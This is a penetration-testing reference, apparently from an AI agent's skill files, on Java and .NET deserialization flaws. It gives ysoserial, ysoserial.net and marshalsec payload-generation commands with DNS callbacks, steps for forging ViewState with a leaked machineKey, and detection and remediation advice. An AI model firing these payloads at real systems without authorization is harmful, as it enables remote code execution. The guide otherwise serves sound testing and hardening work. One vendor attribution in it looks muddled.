# Java, .NET, and JVM/CLR YAML/XML Deserialization

Each entry: **RECOGNIZE → TOOL/GADGET → SAFE PoC → REAL CVE/REF → DETECT → REMEDIATE**.
All PoCs use a **benign command (`id`/DNS callback)**. Read `../SKILL.md` ⚠️ Safety first.

---

## 1. Java native serialization (`ObjectInputStream.readObject`)

### Recognize
- Raw magic bytes `AC ED 00 05` (`STREAM_MAGIC` + version). Base64 → **`rO0AB`**; gzip’d → `H4sIA`.
- Entry points: serialized cookies / hidden fields, RMI (1099), JMX, **JMS**, **WebLogic
  T3 (7001)**, JBoss/JMXInvoker, Jenkins CLI/remoting, Hessian/Kryo/Burlap endpoints,
  `Content-Type: application/x-java-serialized-object`, HTTP headers, message queues.
- Stack traces mentioning `readObject`, `resolveClass`, `InvalidClassException`,
  `java.io.ObjectInputStream` confirm the sink.

### Tool / gadget
- **`ysoserial`** (frohoff / mbechler fork) — the reference generator. It wraps your
  command in a **property-oriented gadget chain** built from classes already on the
  classpath. Payload families depend on dependencies present:
  - `CommonsCollections1..7` (Apache Commons Collections 3.x/4.x) — the classic.
  - `CommonsBeanutils1`, `Spring1/2`, `Groovy1`, `Hibernate1/2`, `JRMPClient/JRMPListener`,
    `Jdk7u21`, `ROME`, `Click1`, `Vaadin1`, `MozillaRhino1/2`, `Clojure`.
  - **`URLDNS`** — *no* command execution; it only triggers a **DNS lookup**. This is the
    **safest first probe**: it proves the blob is deserialized without running code.
- **Blind class detection:** send a `URLDNS` payload → if your collaborator gets a DNS
  hit, deserialization happens. Then fingerprint which gadget library is present.

```bash
# SAFEST first step — DNS-only, no code execution, proves the sink is live:
java -jar ysoserial.jar URLDNS "http://<token>.oob.example" | base64 -w0
#   -> place b64 in the cookie/param/blob location, watch collaborator for DNS hit.

# If RoE permits RCE proof, use a BENIGN command only:
java -jar ysoserial.jar CommonsCollections5 'id' > payload.bin        # writes 'id' output nowhere destructive
# Prefer an OOB callback over shell so nothing lands on disk:
java -jar ysoserial.jar CommonsCollections6 'nslookup <token>.oob.example' | base64 -w0
```

### Safe PoC pattern
1. `URLDNS` → confirm deserialization (DNS callback). **Stop here if DETECT-ONLY.**
2. If RCE proof required: matching gadget + `id`/`hostname` or a DNS/HTTP OOB command.
3. Capture the request, the callback token, timestamp. Do **not** drop a shell.

### JNDI leg (ties to `web-cve-exploitation`)
Many Java RCE paths (including some gadget chains and **Log4Shell CVE-2021-44228**) pivot
through **JNDI/LDAP/RMI** to fetch a remote class. Tooling: **`marshalsec`**
(`LDAPRefServer`) or `JNDI-Exploit-Kit` to stand up a malicious LDAP/RMI referral, then a
gadget (or a `${jndi:ldap://...}` string) resolves it. For the JNDI mechanics, injection
context, and the benign `${jndi:ldap://<token>.oob}` DNS-only probe, use
**`web-cve-exploitation` (Log4Shell)** — do not weaponize class loading here; a DNS
callback is sufficient proof.

### Real CVE / reference
- **CVE-2015-4852** — Oracle WebLogic T3 (port 7001) Commons-Collections RCE; the bug that
  launched the 2015 "Marshalling Pickles" era. Still in CISA KEV.
- **CVE-2017-9805** — Apache Struts 2 REST plugin **XStream** deserialization (see §4).
- **CVE-2016-4437** — Apache Shiro `rememberMe` cookie (AES-CBC, default key) → CC gadget.
- **Jenkins**, **JBoss**, **OpenNMS** — recurring `readObject` RCEs.

### Detect
- SAST/grep sinks: `ObjectInputStream`, `.readObject(`, `.readUnshared(`, `readResolve`,
  `XMLDecoder.readObject`, Hessian/Kryo/`SerializationUtils.deserialize` (Commons Lang),
  `readExternal`. Any of these on a request-tainted stream = finding.
- Runtime: JVM agents (`NotSoSerial`, `SerialKiller`, `Contrast`) log/deny classes.
- Dependency scan for `commons-collections:3.1`, vulnerable `jackson-databind`, etc.

### Remediate
- **Don't deserialize untrusted native streams.** Prefer JSON/protobuf with explicit schema.
- If unavoidable: **look-ahead deserialization** — override `resolveClass()` with a strict
  **allow-list** (`ValidatingObjectInputStream` from Commons IO, `SerialKiller`, or JEP 290
  **`ObjectInputFilter` / `jdk.serialFilter`** — set a class allow-list / reject-list at the
  JVM or stream level).
- Remove unused gadget libraries; keep `commons-collections`, `jackson-databind`, `spring`,
  `groovy`, `rome` patched. Sign/HMAC serialized tokens if they must round-trip a client.

---

## 2. Jackson / polymorphic JSON (Java)

### Recognize
- JSON containing a **type field**: `"@class":`, `@type`, or shapes appearing when
  **default typing** is on. App uses `jackson-databind` with
  `enableDefaultTyping()` / `@JsonTypeInfo(use = Id.CLASS)`.

### Tool / gadget
- No single tool; the "gadgets" are classes with side-effecting setters/constructors
  reachable when `polymorphic typing` lets JSON name an arbitrary class (e.g. JNDI-backed
  datasources → LDAP fetch). Jackson maintainers maintain a **block-list** — the class is
  an arms race.

### Safe PoC
- Point the type at a class whose instantiation makes a **benign DNS/LDAP lookup to your
  collaborator** (e.g. a JNDI-backed bean → `ldap://<token>.oob`). DNS hit = proof. Do not
  chain to code loading.

### Real CVE / ref
- **CVE-2019-14379 / CVE-2019-14439**, and the long CVE-2017-7525 → 2020 series of
  `jackson-databind` "block-list bypass" gadget CVEs.

### Detect / Remediate
- Grep: `enableDefaultTyping`, `@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS`, `activateDefaultTyping`.
- **Never enable default typing** on untrusted input. Use `PolymorphicTypeValidator`
  (allow-list of base types) on Jackson ≥ 2.10; upgrade databind.

---

## 3. .NET native serializers (BinaryFormatter, SoapFormatter, LosFormatter, NetDataContractSerializer)

### Recognize
- **BinaryFormatter** magic: `00 01 00 00 00 FF FF FF FF` → base64 **`AAEAAAD/////`**.
- Entry points: cookies, WCF/.NET Remoting, cache, `ObjectStateFormatter`/`LosFormatter`
  blobs (ViewState — §5), Telerik `DialogParameters`, `Sitecore`/`Umbraco` state,
  serialized session.

### Tool / gadget
- **`ysoserial.net`** (pwntester) — the .NET analogue. Formatters via `-f`:
  `BinaryFormatter`, `LosFormatter`, `SoapFormatter`, `NetDataContractSerializer`,
  `ObjectStateFormatter`, `Json.Net`, `DataContractSerializer`, `XmlSerializer`.
  Gadgets via `-g`: `TypeConfuseDelegate`, `ActivitySurrogateSelector`,
  `WindowsIdentity`, `PSObject`, `ObjectDataProvider`, `TextFormattingRunProperties`, etc.

```bash
# BENIGN command only (nslookup for OOB proof preferred over any file/shell action):
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -o base64 \
  -c "nslookup <token>.oob.example"
```

### Safe PoC
- Feed the b64 into the sink; watch collaborator for the DNS callback. `whoami`/`id`-style
  output only if RoE requires visible command output.

### Real CVE / ref
- **CVE-2019-18935** — Progress **Telerik UI for ASP.NET AJAX** insecure deserialization
  (`RadAsyncUpload`), CISA-KEV, breach-driver. Full workflow in **`web-cve-exploitation`**.
- **CVE-2017-9822** — DotNetNuke (DNN) cookie deserialization.

### Detect
- Grep: `BinaryFormatter`, `SoapFormatter`, `NetDataContractSerializer`, `LosFormatter`,
  `ObjectStateFormatter`, `.Deserialize(`, `Activator.CreateInstance` on typed input.
- Roslyn analyzers **CA2300–CA2330** flag insecure `BinaryFormatter`/`NetDataContractSerializer`/
  `Json.NET`/`LosFormatter` usage.

### Remediate
- **`BinaryFormatter` is obsolete and disabled** — throws by default since .NET 8, and was
  **removed entirely in .NET 9** (`SYSLIB0011`, breaking-change docs). Migrate to
  `System.Text.Json` / `DataContractSerializer` / `XmlSerializer` with known types.
- If a formatter must stay, bind a **`SerializationBinder`** that allow-lists types.

---

## 4. Json.NET (Newtonsoft) `TypeNameHandling`

### Recognize
- JSON with **`"$type": "System...., mscorlib"`** fields. App sets
  `TypeNameHandling` to `Auto`/`All`/`Objects`.

### Tool / gadget
- `ysoserial.net -f Json.Net -g ObjectDataProvider -c "<cmd>"` produces a `$type`-laden
  payload that instantiates `ObjectDataProvider` → invokes a method (e.g. `Process.Start`).

### Safe PoC
- Benign OOB command; confirm via callback. Do not spawn interactive processes.

### Real CVE / ref
- Class documented by Alvaro Muñoz/Oleksandr Mirosh ("Friday the 13th JSON Attacks",
  BlackHat 2017); Microsoft **CA2329/CA2330**; countless product CVEs (e.g. QuantConnect
  Lean GHSA, various .NET APIs).

### Detect / Remediate
- Grep: `TypeNameHandling` != `None`, `JsonSerializerSettings` with `TypeNameHandling`.
- **Set `TypeNameHandling = None`** (default). If polymorphism is required, use a custom
  `ISerializationBinder` allow-list. Never echo `$type` from client input.

---

## 5. ASP.NET ViewState (`__VIEWSTATE`) — the .NET high-value target

### Recognize
- Hidden field `__VIEWSTATE=...` (long base64, usually ends `=`/`==`) on WebForms `.aspx`.
  Also `__VIEWSTATEGENERATOR`, `__EVENTVALIDATION`. Cookieless mode puts it in the URL.
- ViewState is a **`LosFormatter`/`ObjectStateFormatter`** blob. Whether you can tamper
  depends on **MAC** (integrity) and **encryption**, both keyed by the **`machineKey`**
  (`validationKey` + `decryptionKey`).

### Tool / gadget
- **`Blacklist3r` (AspDotNetWrapper / `viewgen`)** — first checks **MAC status** and tries a
  **known/default/leaked `machineKey`** list against the observed ViewState (a signed blob +
  known generator lets you confirm a key offline).
- **`ysoserial.net -p ViewState`** — generates a signed (and optionally encrypted) ViewState
  RCE payload **once you know the `machineKey`**:

```bash
ysoserial.exe -p ViewState -g TextFormattingRunProperties \
  -c "nslookup <token>.oob.example" \
  --generator="<__VIEWSTATEGENERATOR value>" \
  --validationkey="<hex>" --validationalg="SHA1" \
  --decryptionkey="<hex>" --decryptionalg="AES"
```

### How you actually get there (safe path)
1. Note whether ViewState is **MAC-protected** (default since patched framework) and/or
   encrypted. Remove `__VIEWSTATEENCRYPTED` when testing an unencrypted-but-signed target.
2. Recover `machineKey` from a **leaked/known key** (Blacklist3r list), a **web.config
   disclosure** (LFI/path-traversal — cross-ref `web-vuln-hunting/references/injection.md`),
   a GitHub leak, or a hardcoded default. **Do not brute-force online** (DoS/lockout risk).
3. With the key, sign a **benign** `nslookup <token>.oob` ViewState → DNS callback = proof.

### Real CVE / ref
- ViewState RCE is a **configuration/known-key** class (Soroush Dalili / NotSoSecure /
  Claranet writeups). Microsoft **ThreatLocker/Volt-Typhoon-era advisories** on **leaked
  static `machineKey`** values enabling ViewState RCE at scale (2024–2025).

### Detect
- Look for `enableViewStateMac="false"` (never do this), static `machineKey` in `web.config`
  checked into source, framework versions predating MAC-always-on.

### Remediate
- **Keep ViewState MAC on** (it is enforced by default in patched frameworks — never
  disable). **Encrypt** ViewState (`viewStateEncryptionMode="Always"`).
- **Never hardcode/share `machineKey`**; auto-generate per-app, rotate leaked keys, store
  out of source control. Minimize what goes into ViewState. Prefer not to store objects.

---

## 6. YAML deserialization — SnakeYAML (Java), and cross-JVM

### Recognize
- YAML body/upload with **type tags**: `!!javax.script...`, `!!com.sun...`,
  `!!org.springframework...`, `!!javax.management...`. App calls SnakeYAML `new Yaml().load()`
  with the default `Constructor`.

### Tool / gadget
- **`marshalsec`** generates SnakeYAML (and other) payloads, typically a
  `ScriptEngineManager`/JNDI reference (`!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader...]`).
- Pair with a **`marshalsec` LDAP/HTTP server** for the class-fetch leg — but for **safe
  proof, use a DNS/HTTP-only reference to your collaborator**, not remote class loading.

### Safe PoC
- A YAML tag that forces a **URL fetch / DNS lookup** to `<token>.oob` proves the unsafe
  `Constructor` runs. Stop at the callback.

### Real CVE / ref
- **CVE-2022-1471** — SnakeYAML `Constructor` RCE (GHSA-mjmj-j48q-9wg2). Fixed by
  **SnakeYAML 2.0** defaulting to `SafeConstructor`.

### Detect / Remediate
- Grep: `new Yaml()` without `SafeConstructor`, `yaml.load(` (SnakeYAML < 2.0).
- **Use `new Yaml(new SafeConstructor())`** or SnakeYAML **≥ 2.0** (safe by default);
  or `LoaderOptions` with an allow-list `TagInspector`.

---

## 7. XML deserialization — XStream, XMLDecoder, XmlSerializer

### Recognize
- XML bodies with `<java.lang...>`, `<dynamic-proxy>`, `<handler class=...>`,
  `<java.beans.EventHandler>`, or `<object class="...">` (XMLDecoder). SOAP/REST XML.

### Tool / gadget
- **`ysoserial`/`marshalsec`** generate XStream and XMLDecoder payloads (e.g.
  `ImageIO`/`ProcessBuilder`/JNDI gadgets).

### Safe PoC
- Benign command / OOB callback via the generated payload; confirm and stop.

### Real CVE / ref
- **CVE-2017-9805** — Apache **Struts 2 REST plugin** XStream deserialization RCE (KEV).
- **CVE-2021-39144** and the CVE-2021-2112x XStream series; **XMLDecoder** RCE
  (Restlet/various). `XmlSerializer` is generally safe unless combined with unsafe
  `Type`/`ExpectedException` handling.

### Detect / Remediate
- Grep: `XStream().fromXML(`, `java.beans.XMLDecoder`, `new XmlSerializer(` with attacker-typed input.
- **XStream ≥ 1.4.18** ships a **security framework in allow-list ("no permission by
  default") mode** — configure `xstream.allowTypes(...)` / `denyTypes`. Avoid `XMLDecoder`
  on untrusted XML entirely. For XXE in the same XML surface, see
  `web-vuln-hunting/references/injection.md`.
